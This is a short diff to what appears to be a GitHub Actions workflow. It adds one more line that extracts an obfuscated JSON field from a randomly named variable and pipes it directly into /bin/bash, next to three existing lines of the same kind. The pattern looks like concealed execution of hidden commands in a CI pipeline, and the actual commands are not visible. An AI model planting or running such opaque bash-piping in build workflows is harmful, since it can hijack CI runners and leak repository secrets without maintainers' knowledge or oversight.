@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$cvab3" | jq -r .sg910 | /bin/bash
           echo $gznx67 | jq -r .u77984 | /bin/bash
           echo $kgno692 | jq -r .o67932 | /bin/bash
+          echo $tud62 | jq -r .puzi41886 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
